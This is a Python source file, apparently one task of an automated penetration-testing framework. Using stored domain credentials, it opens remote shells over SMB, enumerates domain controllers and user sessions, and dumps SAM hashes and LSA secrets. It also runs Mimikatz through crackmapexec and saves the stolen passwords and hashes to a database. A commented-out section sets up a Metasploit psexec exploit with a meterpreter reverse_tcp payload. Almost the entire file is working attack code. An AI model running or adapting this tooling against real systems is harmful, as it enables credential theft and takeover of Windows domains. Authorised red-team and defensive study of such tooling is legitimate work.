from msf import exploit
import time
import base64 
import asyncproc
import os 
import string
import random
import re

def cleanstr(st):
    clean = lambda dirty: ''.join(filter(string.printable.__contains__,dirty))
    return clean(st)

def getItem(params):
#    sql = """
#        select
#            hd.id, hd.ip_address, dc.domain, dc.username, dc.cleartext_password, m.id
#        from
#            domain_credentials_map m
#            join host_data hd on hd.id = m.host_data_id
#            join domain_credentials dc on dc.id = m.domain_credentials_id
#        where
#            m.id = %s and
#            hd.successful_info_gather = false and dc.valid = true"""

    sql = """
        select
            hd.id, hd.ip_address, dc.domain, dc.username, dc.cleartext_password, m.id
        from
            domain_credentials_map m
            join host_data hd on hd.id = m.host_data_id
            join domain_credentials dc on dc.id = m.domain_credentials_id
        where
            m.id = %s and dc.valid = true"""
            
    cursor = params.db.cursor()
    cursor.execute(sql, (params.item_identifier, ))
    row = cursor.fetchone()
    cursor.close()
    return row

def checkForDuplicateTask(params, host):
    result = False

    cursor2 = params.db.cursor()
    sql2 = """select hd.ip_address 
    from task_list tl join domain_credentials_map m on m.id = tl.item_identifier join host_data hd on hd.id = m.host_data_id 
    where tl.task_descriptions_id = 17 and tl.in_progress = true and tl.completed = false and tl.footprint_id = %s and hd.ip_address = %s and tl.id != %s"""
    cursor2.execute(sql2, (params.footprint_id, host, params.task_id))
    rows = cursor2.fetchall()
    for r in rows:
        result = True
        break
    cursor2.close()

    return result

def GetProcess(params, domain, username, password, host):
    proc = None
    #try:
    if True:
        proc = asyncproc.Process(["./software/adsmbexec.py", "{}/{}:{}@{}".format(domain, username, password, host)])
        params.log("./software/adsmbexec.py {}/{}:{}@{}".format(domain, username, password, host))
        runWithDifferentUser = False
        gotShell = False
        startTime = time.time()
        while True:
            poll = proc.wait(os.WNOHANG)
            out = proc.read()
            time.sleep(0.25)
        
            if time.time() - startTime >= 60:
                #print "too much time has passed. quitting"
                #log = log + "too much time has passed. quitting" + "\r\n"
                #params.log("too much time has passed. quitting")

                break

            if out != "":
                print out

            if out.find("Windows") > -1:
                gotShell = True
                break
            elif out.find("SMB SessionError") > -1:
                proc = None
                break
            elif out.find("The target principal name is incorrect") > -1:
                runWithDifferentUser = True
            elif out.find("'dsquery' is not recognized as an internal or external command") > -1:
                runWithDifferentUser = True

    return proc

def runCmd(proc, params, cmd):
    print "C:\Windows\system32>" + cmd 
    print ""

    params.log(cmd)

    proc.write(cmd + "\n")
    time.sleep(0.5)
    result = ""
    gotShell = False

    startTime = time.time()
    while gotShell == False:
        poll = proc.wait(os.WNOHANG)
        out = proc.read()
        time.sleep(0.25)

        if time.time() - startTime >= 20:
            print "too much time has passed. quitting"
            break

        if out != "":
            result += result + out
            params.log(out)
        if out.upper().find("Windows".upper()) > -1:
            gotShell = True
    print result 
    print "----------"
    print ""
    return result

def parse_dclist(params, host_domain, log):
    for l in log.split("\r\n"):
        if l.find("`[DS]") > -1:
            while l.find("  ") != -1:
                l = l.replace("  ", " ")

            hostname = l.split(" ")[1]
            #print "[{}]".format(hostname)
            dcips = os.popen("host {} | cut -d \  -f 4".format(hostname)).read()[:-1]
            for dcip in dcips.split("\n"):
                if dcip != "found:":
                     #print "dc {} has ip {}".format(hostname, dcip)
                     
                     cursor = params.db.cursor()
                     #cursor.execute("call addHost(%s, %s, %s, 1)",  (params.footprint_id, dcip, hostname, ))
                     cursor.execute("select addHost(%s, %s::varchar, %s::varchar, true)",  (params.footprint_id, dcip, hostname, ))
                     cursor.close()

                     sql = "update host_data set domain = %s::varchar where footprint_id = %s and ip_address = %s::varchar"
                     cursor = params.db.cursor()
                     cursor.execute(sql, (host_domain, params.footprint_id, dcip, ))
                     cursor.close()
                     print "!!!!! update domain to [{}] for host [{}]".format(host_domain, dcip)

def parse_dsgetdc(params, host_domain, log):
    dcip = ""
    dcname = ""

    for l in log.split("\r\n"):
        if l.find("Address") != -1: dcip = l.split(":")[1].strip()[2:]
        elif l.find("Dom Name") != -1: dcname = l.split(":")[1].strip().split(".")[0]
        elif l.find("Flags:") != -1:
            #dcflags = l.split(":")[1].strip()
            #print "found domain controller: {0} {1}".format(dcname, dcip)

            cursor = params.db.cursor()
            #cursor.execute("call addHost(%s, %s, '', 1)",  (params.footprint_id,  dcip, ))
            cursor.execute("select addHost(%s, %s::varchar, ''::varchar, true)",  (params.footprint_id,  dcip, ))
            cursor.close()

            sql = "update host_data set domain = %s where footprint_id = %s and ip_address = %s"
            cursor = params.db.cursor()
            cursor.execute(sql, (host_domain, params.footprint_id, dcip, ))
            cursor.close()
            print "!!!!! update domain to [{}] for host [{}]".format(host_domain, dcip)


def getHostSessions(params, host_id, host, domain, username, password):
    result = ""
    cmd = "nmap --script-args=smbdomain={},smbusername={},smbpassword={} -p 445 -Pn -n {} --script smb-enum-sessions".format(domain, username, password, host)
    print "~/ {}".format(cmd)
    result = os.popen(cmd).read()

    params.log(cmd)
    params.log(result)


    inSection = False
    for l in result.split("\n"):
        if l.find("Users logged in") != -1:
            inSection = True
            continue

        if l.find("Active SMB sessions") != -1:
            inSection = False
            break

        if inSection:
            if l != "":
                while l.find("  ") != -1:
                    l = l.replace("  ", " ")
                print "  -> [{}]".format(l.split(" ")[1])
                cursor = params.db.cursor()
                cursor.execute("select addToken(%s, %s::varchar)", (host_id, l.split(" ")[1], ))
                cursor.close()

           

    return result

def getLSAsecrets(params, host_id, host, domain, username, password):
    #log = os.popen("cat dbtemp/sampleout.txt".format()).read()
    params.log("./software/adsecretsdump.py {}/{}:{}@{}".format(domain, username, password, host))
    log = os.popen("./software/adsecretsdump.py {}/{}:{}@{}".format(domain, username, password, host)).read()
    params.log(log)
    currentSection = ""


    if log.find("Dumping Domain Credentials") > -1:
        print "host is a dc"
        cursor = params.db.cursor()
        cursor.execute("update host_data set is_dc = true where footprint_id = %s and ip_address = %s", (params.footprint_id, host, ))
        cursor.close()
        return

    for l in log.split("\n"):
#        if l.find("Dumping Domain Credentials") > -1:
#            print "host is a dc"
#            cursor = params.db.cursor()
#            cursor.execute("update host_data set is_dc = true where footprint_id = %s and ip_address = %s", (params.footprint_id, host, ))
#            cursor.close()
#            currentSection = "Domain Controller"
#            break

        if l.find("Dumping local SAM hashes") > -1:
            currentSection = "local admin hashes"
            continue
        elif l.find("Dumping LSA Secrets") > -1:
            currentSection = "LSA"
            continue
        elif l.find("Cleaning up") > -1:
            break

        if currentSection == "local admin hashes":
            user = l.split(":")[0]
            lm_hash = l.split(":")[2]
            nt_hash = l.split(":")[3]
            print "local hash [user:[{}] lm:[{}] nt:[{}]]".format(user, lm_hash, nt_hash)
            cursor = params.db.cursor()
            cursor.execute("select addLocalCredentials(%s, %s::varchar, %s::varchar, %s::varchar, %s::varchar)", (host_id, user, "", lm_hash, nt_hash, ))
            cursor.close()
        elif currentSection == "LSA":
            if l.find("[*]") == -1:
                try:
                    domain = l.split("\\")[0]
                    user = l.split("\\")[1].split(":")[0]
                    passwd = l.split("\\")[1].split(":")[1]
                    print "LSA [domain:[{}] user:[{}] pass:[{}]]".format(domain,user,passwd)
                    cursor = params.db.cursor()
                    cursor.execute("select addDomainCreds(%s, %s, %s::varchar, %s::varchar, %s::varchar, '', '')",  (params.footprint_id, host_id, domain, user, passwd, ))
                    cursor.close()
                except:
                    pass

def isHostADC(params, host_id):
    cursor = params.db.cursor()
    cursor.execute("select is_dc from host_data where footprint_id = %s and id = %s", (params.footprint_id, host_id, ))
    row = cursor.fetchone()
    result = row[0]
    cursor.close()
    return result

def needToListDCHosts(params, domain_name):
    cursor = params.db.cursor()
    cursor.execute("select count(*) from host_data where footprint_id = %s and upper(domain) = upper(%s) and is_dc = true", (params.footprint_id, domain_name, ))
    res = cursor.fetchone()[0]
    cursor.close()
    
    return res == 0


def isInt(i):
    result = False
    try:
        i = int(i)
        result = True
    except:
        result =False

    return result


def isIp(st):
    result = False
    if st.count(".") == 3:
        st_arr = st.split(".")
        if isInt(st_arr[0]):
            if isInt(st_arr[1]):
                if isInt(st_arr[2]):
                    if isInt(st_arr[3]):
                        result = True
    return result


def runMimikatz(params, host_id, host, domain, username, password):
    ansi_escape = re.compile(r'\x1b[^m]*m')
    temp_file_name = params.getRandomFileName()
    cmd = "timeout 120 crackmapexec {} -u {} -p {} -d {} -M mimikatz --server-port {} > temp/{}".format(host, username, password, domain, params.getOpenPort(), temp_file_name)
    params.log(cmd)
    params.log("")
    os.popen(cmd)

    log = ansi_escape.sub('', os.popen("cat temp/{0}".format(temp_file_name)).read())
    #params.log(os.popen("cat temp/{0}".format(temp_file_name)).read())
    params.log(log)

    gotCreds = False
    hostname = ""
    for line in open('temp/' + temp_file_name):
        line = ansi_escape.sub('', line[:-1])
        if line.find("name:") != -1 and line.find("domain:") != -1:
            hostname = line.split("name:")[1].split(")")[0]
            windows_version = ""
            print "hostname:[{}] version [{}]".format(hostname, windows_version)
        if line.find("Found credentials in Mimikatz output") > -1:
            gotCreds = True
            continue

        if line.find("Saved Mimikatz") > -1:
            gotCreds = False
            break

        if gotCreds:
            while line.find("  ") > -1:
                line = line.replace("  ", " ")

            creds = line.split(" ")[4].strip()

            if isIp(creds.split("\\")[0]):
                print " --> special case. changing [{}] to [{}]".format(creds, creds[len(creds.split("\\")[0]) + 1:])
                creds = creds[len(creds.split("\\")[0]) + 1:]
               

            domain = creds.split("\\")[0]
            if domain.find(".") > -1:
                domain = domain.split(".")[0]
            username = creds.split("\\")[1].split(":")[0]
            password = creds[len(creds.split("\\")[0]) + len(username) + 2:].strip()

            if len(creds.split("\\")) > 2:
                password = creds[(len(domain) + len(username) + 2) * 2:] 
                # print " --> special case [{}] [{}] [{}] [{}]".format(creds, domain, username, password)


            if username.find("$") == -1:
                if not isHash(password):
                    #print "[" + creds + "]"
                    if domain.upper() != hostname.upper():
                        if domain.upper() != "(NULL)":
                            if username.find("@") == -1:
                                cursor = params.db.cursor()
                                cursor.execute("select addDomainCreds(%s, %s, %s::varchar, %s::varchar, %s::varchar, '', '')",  (params.footprint_id, host_id, domain, username, password, ))
                                cursor.close()
                                # print "[{}]\[{}]:[{}] [{}] -- [{}]".format(domain, username, password, password[:len(creds.split("\\")[0]) + len(username) + 1], isHash(password))

def isHash(s):
    result = False
    if len(s) == 32:
        result = True
        if s == s.lower():
            result = True
    return result

def run(params):
    item = getItem(params)
    if item != None:
        if checkForDuplicateTask(params, item[1]):
            params.log("another task is currently trying the same thing. will try again later")
            params.setReturnValue("run again")
        else:
            delimited_pwd = ""
            for c in item[4]:
                delimited_pwd += "\\" + c
            runMimikatz(params, item[0], item[1], item[2], item[3], delimited_pwd)
            return
            proc = GetProcess(params, item[2], item[3], item[4], item[1])
            if proc != None:
                delimited_pwd = ""
                for c in item[4]:
                    delimited_pwd += "\\" + c


                host_domain = cleanstr(runCmd(proc, params, "wmic computersystem get domain").split("\n")[1].split(".")[0])
                cr = params.db.cursor()
                cr.execute("update host_data set domain = %s::varchar where id = %s::int", (host_domain, int(item[0]), ))
                cr.close()

                # TODO probably, get architecture, for mimikatz/wce

                #if needToListDCHosts(params, host_domain):
                if True:
                    parse_dclist(params, host_domain, runCmd(proc, params, "nltest /dclist:"))
                    parse_dsgetdc(params, host_domain, runCmd(proc, params, "nltest /dsgetdc: /IP"))
                    #getHostSessions(params, item[0], item[1], item[2], item[3], delimited_pwd)

                proc.write("exit\n")                

            sessions = getHostSessions(params, int(item[0]), item[1], item[2], item[3], delimited_pwd)
            
            if isHostADC(params, item[0]) == False:
                getLSAsecrets(params, item[0], item[1], item[2], item[3], delimited_pwd)
                
            runMimikatz(params, item[0], item[1], item[2], item[3], delimited_pwd)
# 1) sysinfo - with nmap sysinfo / unless covered by the smb upload script
# 2) nltest /dclist: - with smbexec.py
# 3) nltest /dsgetdc: /IP - with smbexec.py
# 4) list user tokens - with nmap enum sessions
# 5) hashdump/secrets dump - run secretsdump.py - only if not a dc
# 6) mimikatz - with smbexec - 

    else:
        params.log("this task has already been successfully handled with a different set of creds")












#def run(params):    
#    sql = """
#        select
#            hd.id, hd.ip_address, dc.domain, dc.username, dc.cleartext_password, m.id
#        from
#            domain_credentials_map m
#            join host_data hd on hd.id = m.host_data_id
#            join domain_credentials dc on dc.id = m.domain_credentials_id
#        where
#            m.id = %s and
#            hd.successful_info_gather = false and dc.valid = true"""
#            
#    cursor = params.db.cursor()
#    cursor.execute(sql, (params.item_identifier, ))
#    row = cursor.fetchone()
#    cursor.close()
#    
#    if row == None:
#        #params.log("Authenticate to {0} using creds {1}\\{2}".format(row[1], row[2], row[3]))
#        #params.log("")
#        #params.log("This task was skipped to save time, as the task has already been run with a different set of creds")
#        params.log("this task has already been successfully handled with a different set of creds")
#        return
#    
#    waitForDifferentTask = False
#    cursor2 = params.db.cursor()
#    sql2 = """select hd.ip_address 
#    from task_list tl join domain_credentials_map m on m.id = tl.item_identifier join host_data hd on hd.id = m.host_data_id 
#    where tl.task_descriptions_id = 17 and tl.in_progress = true and tl.completed = false and tl.footprint_id = %s and hd.ip_address = %s and tl.id != %s"""
#    cursor2.execute(sql2, (params.footprint_id,  row[1], params.task_id))
#    rows = cursor2.fetchall()
#    for r in rows:
#        waitForDifferentTask = True
#        break
#    cursor2.close()
#    
#    if waitForDifferentTask == True:
#        time.sleep(5)
#        params.log("another task is currently trying the same thing. will try again later")
#        params.setReturnValue("run again")
#    else:
#
#
#        if row != None:
#            host_data_id = row[0]
#            print "log into host {0} with domain creds {1}\{2}:{3}".format(row[1], row[2], row[3], row[4])
#
#
#
#
#
# 1) sysinfo - with nmap sysinfo / unless covered by the smb upload script
# 2) nltest /dclist: - with smbexec.py
# 3) nltest /dsgetdc: /IP - with smbexec.py
# 4) list user tokens - with nmap enum sessions
# 5) hashdump/secrets dump - run secretsdump.py - only if not a dc
# 6) mimikatz - with smbexec - 
#













        
#        if row != None:
#            host_data_id = row[0]
#            #print "log into host {0} with domain creds {1}\{2}:{3}".format(row[1], row[2], row[3], row[4])
#            #params.log("log into host {0} with domain creds {1}\{2}:{3}".format(row[1], row[2], row[3], row[4]))
#            cursor.close()
#            
#            setup = [
#                "use exploit/windows/smb/psexec", 
#                "set PAYLOAD windows/meterpreter/reverse_tcp", 
#                "set RHOST {0}".format(row[1]),
#                "set LHOST {0}".format(params.getLocalHost()),
#                "set LPORT {0}".format(params.getOpenPort()),
#                "set smbdomain {0}".format(row[2]),
#                "set smbuser {0}".format(row[3]),
#                "set smbpass {0}".format(row[4]),
#                "exploit"
#            ]
#            
#            log = ""
#            
#            result = exploit.runMsf(params, row[0], setup, "psexec")
#            for l in result[1]:
#                log = log + l + "\r\n"
#                params.log(l)
#            
#            if result[0] == True:
#                cursor = params.db.cursor()
#                cursor.execute("update host_data set successful_info_gather = true where id = %s", (row[0], ))
#                cursor.close()
#
#                cursor = params.db.cursor()
#                cursor.execute("update domain_credentials_map set psexec_failed = false where id = %s", (row[5], ))
#                cursor.close()
#
#            else:
#                if result[2] == False:
#                    cursor = params.db.cursor()
#                    cursor.execute("update domain_credentials_map set psexec_failed = true where id = %s", (row[5], ))
#                    cursor.close()
#                
#            cursor = params.db.cursor()
#            cursor.execute("insert into exploit_logs (host_data_id, vulnerability_description_id, log) values(%s, %s, %s)", (host_data_id, 4, base64.b64encode(log), ))
#            cursor.close()
